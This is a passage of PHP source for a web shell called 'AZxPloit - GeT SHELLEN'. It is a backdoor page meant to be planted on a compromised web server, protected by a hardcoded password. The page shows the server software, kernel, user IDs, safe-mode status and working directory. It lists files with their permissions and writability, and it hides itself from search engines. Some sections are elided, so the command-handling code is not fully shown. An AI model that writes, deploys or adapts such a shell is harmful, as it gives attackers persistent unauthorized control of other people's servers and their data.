<?php
error_reporting(0);
$password='ayBalam';//shell kodu buraya
$xyn='psatir';
...
$me=basename(__FILE__);$server_soft=$_SERVER["SERVER_SOFTWARE"];$uname=php_uname();$cur_user=get_current_user().' uid:'.getmyuid().' gid:'.getmygid();$safe_mode=ini_get('safe_mode');$safe_mode=($safe_mode)?('<font color:lime>ON</font>'):('<font color=red>OFF</font>');$cwd=getcwd();$bckC='#000';$txtC='#CF0000';
$start='<html><head>
<!-- brat bayraqlar qalsin v2
<img style="left: 0px; position: absolute; top: 0px;" width="112" height="108" src="https://i.hizliresim.com/hyivgqm.png"/>
<img style="right: 0px; position: absolute; top: 0px;" width="112" height="108" src="https://i.hizliresim.com/613ck6k.png">
-->
<link href=https://fonts.googleapis.com/css?family=Righteous&display=swap rel=stylesheet>
<link rel=icon type=image/png href=https://difai-team.org/styles/difaidark/basic/31x31.png sizes=32x32 />
<title>AZxPloit - GeT SHELLEN</title>
<style>
				::-moz-selection {
					color: black;
					background: white;
				...
				::-webkit-scrollbar-thumb {
					...
					-webkit-box-shadow: inset 0 0 6px rgba(0,0,0,84); 
					background: #FF0000;
				} hr { border:0; height:1px; background:#fff;} body {background:'.$bckC.';color:'.$txtC.';font-size:9pt;font-family:Righteous;}h1#n{position:fixed;top:10px;left:10px;text-shadow:0px 0px 5px black;color:lime;} h1#nm{text-shadow:0px 0px 5px black;color:#CF0000;}a {color:'.$txtC.';text-decoration:none;font-family:monospace;}a:hover {color:#fff; text-shadow: 0pt 0pt 0.99em #fff, 0pt 0pt 0.99em #fff;}hr {height:1px;border:0;background:'.$txtC.';color:black;}p#bck{position:fixed;top:20px;right:20px;}#menu {position: fixed; bottom:0;width:100%;font-size:10pt;}#menuB {background:'.$bckC.'; padding:5px 20px 5px 20px;border:1px solid #CF0000;}table#moreI{font-size:9pt;background:'.$bckC.';padding:5px;position:fixed;bottom:40px;right:40px;display:none;}p#cp {font-size:9pt;}table#lt {font-size:9pt;}input#lt,input#sv {background:'.$bckC.';border:1px solid '.$txtC.';color:'.$txtC.';text-align:center;}input#ltb {background:rgba(0,0,0,0);color:'.$txtC.';box-shadow:0px 0px 1px '.$txtC.';border:0px solid rgba(0,0,0,0);}table#ft {font-size:9pt;padding:5px;box-shadow:0px 0px 10px black;}td#fh {text-shadow: 0pt 0pt 0.99em #CF0000, 0pt 0pt 0.99em #CF0000; border-bottom:0px solid '.$txtC.';padding-bottom:3px;}tr#fn:hover{background: #EDEDED;color:#fff; text-shadow: 0pt 0pt 0.99em #fff, 0pt 0pt 0.99em #fff;}h3 {text-shadow:0px 0px 4px black;font-size:9pt;}textarea#edit {background:'.$bckC.';color:'.$txtC.';box-shadow:0px 0px 10px black;border:none;padding:10px;}</style><script type="text/javascript">function get_inf() {if(document.getElementById(\'moreI\').style.display=="block"){document.getElementById(\'moreI\').style.display="none"}else {document.getElementById(\'moreI\').style.display="block";}} function xyn(id1,id2) {document.getElementById(id1).style.display="block";document.getElementById(id2).style.display="none";}</script></head><body>';
$end='</body></html>';$inf='<p id="inf"> 
<b><center><h1><a href="?"><center><!-- <br><img src=https://i.hizliresim.com/38qlkj0.png width=298 height=220> --> <br>AZxPloit</a></h1></center>
<br><br>SOFTWARE : </b> '.$server_soft.'  <br>  <b>UNAME : </u></i></b> '.$uname.' <br> <b>USER : </b> '.$cur_user.'  <br> <b>SAFE MODE : </b> '.$safe_mode.' <br> <b>DIRECTORY : </b>'.$cwd.'<br></p><hr>';
...
if(isset($_REQUEST['x']))
{
	...
	switch($_REQUEST['x'])
	{
		...
		case 'basBayra': setcookie($xyn,'',time()-3600);let_him_in();break;
	}
}
else
{
	...
	print '</br>';
	print '<center>[ <a href="?x=basBayra"><font color=red>Logout</font></a> ] - [ <a href="https://github.com/cybercriminator">Contact</a> ]</center>';
	print '<p align="center" id="cp">'.curpath('').'</p>';
	print '</br><hr>';
	$filex=array();
	$dirx=array();
	print '<table width="100%" align="center" id="ft" ><td id="fh" align="center"><b>Fayl adı</b></td><td id="fh" align="center"><b>İcazələr</b></td><td id="fh" align="center"><b>Owner/Group</b></td><td id="fh" align="center"><b>Options</b></td><tr id="fn">';
...
function get_color($f){if(is_writable($f)) {$c='lime';}if(!is_writable($f) && is_readable($f)) {$c=''.$txtC.'';}if(!is_writable($f) && !is_readable($f)) {$c='#CF0000';}return($c);}
...
<style>
  				body {
					background: url(https://i.hizliresim.com/b8yogra.gif)
...
<META NAME="robots" CONTENT="noindex,nofollow"> <!-- hihi balam google pesidi -->
<title>AZxPloit - GeT SHELLEN</title>

<center><br><img src=https://i.hizliresim.com/7corox1.png width=600 height=400></img><br>
<font face=Righteous size=8 color=#CF0000>[</font><font face=Righteous size=8 color=#ffffff>AZxPloit - GeT SHELLEN</font><font face=Righteous size=8 color=#CF0000>]</font><br><br>

<form action="'.basename(__FILE__).'" method="POST"><input type="password" maxlength="10" name="pass" style="font-family:Righteous;margin-top:10px;width:150px;background:transparent;color:#ffffff;border:2px solid #CF0000;border-radius:2px;">
<input type="submit" value=">>" style="font-family:Righteous;margin-top:10px;width:75px;background:transparent;color:#ffffff;border:2px solid #CF0000;border-radius:2px;"></form>
<br><br>
<font style="font-size: 20px;" color="white" face="Righteous">Coder By: Ramil Feyziyev</font><br><br>
<font style="font-size: 14px;" color="white" face="Righteous">Bratvalar:<br>kenan54 - fedi bouzariata</font>
<audio id="balaminMahnisi"> <source src="https://1-dao.com.cn/iNNDRiVE-Oriente.mp3"></audio>
<script>
    var x = document.getElementById("balaminMahnisi");
    function play() {
      x.play(); 	
    } 	 	
    </script>
